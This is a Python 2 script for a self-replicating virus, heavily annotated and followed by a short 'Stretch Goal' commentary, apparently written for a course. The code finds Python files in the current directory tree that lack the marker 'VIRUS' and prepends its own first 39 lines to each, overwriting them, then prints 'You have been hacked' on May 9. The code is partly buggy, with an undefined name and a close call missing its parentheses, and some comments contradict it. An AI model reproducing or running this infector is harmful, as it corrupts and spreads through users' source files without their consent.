#!/usr/bin/python # using the python interpreter
# these `import` statements bringing os and datetime library to be used in this script
import os
import datetime
# assigning string virus to the variable
SIGNATURE = "VIRUS"

# This is a function to output an array. It inserts files that hasn't had word, virus, in the python file and append
# it to the array
def locate(path):
    # creating an empty list, array
    files_targeted = []
    # listing the directory from that path argument that this function is taking in and assigning that to filelist
    filelist = os.listdir(path)
    # running a for loop to access files/folders in the directory path
    for fname in filelist:
        # if the specified path is an existing directory it will return boolean true otherwise false
        if os.path.isdir(path+"/"+fname):
            # hitting true from previous if logic, follwing statement will recurse the locate function again 
            # and seeing if there is more folder in this directory
            files_targeted.extend((locatepath+"/"+fname))
        # if the file's third index from the back is python file it will enter into this if logic
        elif fname[-3:] == ".py":
            # this sets infected variable as false
            infected = False
            # running for loop iteration to print out line by line
            for line in open(path+"/"+fname):
                # if the line in the python file contains word, virus, then it will set variable to true and
                # break out of this for loop
                if SIGNATURE in line:
                    infected = True
                    break
            # if previous if logic never hit, then the python file didn't contain virus so infected will be still
            # set to be false, hence it will hit this logic and put the file into the files_targeted array
            if infected == False:
                files_targeted.append(path+"/"+fname)
    # returning the array at the end
    return files_targeted

# this function is designed to override python files that doesn't have virus string and concatenating the virus file with current files content.
def infect(files_targeted):
    #this prints prints absolute path to the given file
    virus = open(os.path.abspath(__file__))
    #declaring a variable call virusstring and attach it with empty string
    virusstring = ""
    #running the for loop to access the file and output each line in that file
    for i,line in enumerate(virus):
        # if the i is greather than or equal 0 and i is less than 39 then this if logic will hit
        if i&gt;=0 and i &lt;39:
            # storing each lines within line 0 to line 39 of string into the `virusstring` variable
            virusstring += line
    # closing the open file from the memory
    virus.close
    # running a for loop to access the filename withtin the files_targeted array
    for fname in files_targeted:
        # declaring a variable call f and assigning the open file in the files_targeted array to the variable f
        f = open(fname)
        # declaring a variable and assigning all of the lines within the file to the variable.
        temp = f.read()
        # closing the f file from the memory
        f.close()
        # opening file this time with writing modifier, and override the fname file.
        f = open(fname,"w")
        # writing the long texts of string thats previously stored from virusstring and concatenate that to the temp variable that has all of the lines from f file.
        f.write(virusstring + temp)
        # closing the file from the memory
        f.close()

# this function to validate current date with may 9th and if its, then print out the fact that user has been hacked.
def detonate():
    # if the current date is may may 9th then execute following code block
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # printing to the terminal that you have been hacked.
        print "You have been hacked"

# these are where all of the function will be invoked and executed.
## this variable is storing the list that had outputted from locate function call
files_targeted = locate(os.path.abspath(""))
# to call the infect function with output array that is resulted from locate function
infect(files_targeted)
# to invoke function detonate to print out to the user that they been hacked if the today's date is May 5th.
detonate()


## Stretch Goal
# The functions above are utilizing the os library to do the operation. For locate function, it is using listdir, and isdir in the os library. This is a function in os that outputs boolean if there is such director is available. It also utilize listdir which will print out list of files/folder in the given path. Other functions that was used in that function are array builtin function such adding item to the list or extending the list. 
    # infected also uses os library as well. First it ulitize path.abspath which give absolute path of given file in the parameter. Another builtin python function it utilizes was open operation. `Open` is used to open the file and using that to read or write the file. 
# This is malware that overrides the python file with string of texts. With given text that attacker feeds and original content in the the python file, it overrides the file and put all of them in same categories.
# I think this is a well written code in that it does what attacker intended to do. However, some of the functions fulfills multiple things which can be refactored. A function should do one job and do great at it, where infect and locate function seems to be overloaded with multiple functionality.